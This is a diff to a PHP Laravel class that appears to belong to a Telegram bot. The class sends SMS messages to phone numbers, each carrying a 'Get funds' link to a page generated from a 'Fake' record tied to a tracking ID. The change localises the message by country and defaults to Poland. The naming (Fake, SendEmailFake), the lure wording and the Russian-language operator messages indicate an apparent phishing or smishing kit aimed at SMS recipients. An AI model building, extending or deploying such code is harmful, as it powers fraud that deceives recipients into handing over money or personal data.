@@ -5,8 +5,10 @@ namespace App\Telegram\Dialogs;
 use App\Api\SmsApi;
 use App\Mail\SendEmailFake;
 use App\Models\Category;
+use App\Models\Country;
 use App\Models\TelegramUser;
 use Exception;
+use Illuminate\Support\Facades\App;
 use Illuminate\Support\Facades\Mail;
 use Log;
 use App\Models\Fake;
@@ -81,6 +83,8 @@ class SendDialog extends Dialog
                 $this->setData('error', false);
                 $data = $this->getData()->only(['track_id', 'number'])->toArray();
                 $fake = Fake::whereTrackId($data['track_id'])->first();
+                $locale = $fake->country->locale ?? Country::locale(Country::POLAND);
+                if (!App::isLocale($locale)) App::setLocale($locale);
                 $link = SmsApi::getSlug($data['number'], $fake->link(false, true));
                 if (parse_url($link, PHP_URL_SCHEME) === 'http') $link = str_replace('http://', 'https://', $link);
                 switch ($fake->category->name) {
@@ -100,7 +104,7 @@ class SendDialog extends Dialog
                         $senderID = null;
                         break;
                 }
-                $result = SmsApi::sendSms($data['number'], "Zdobądź fundusze : https://$link", $senderID)->getData(true);
+                $result = SmsApi::sendSms($data['number'], __("Get funds : :link", ["link" => "https://$link"]), $senderID)->getData(true);
                 if ($result['error']) {
                     $text = $this->makeText([
                         "❗️ <b>Ошибка</b>",
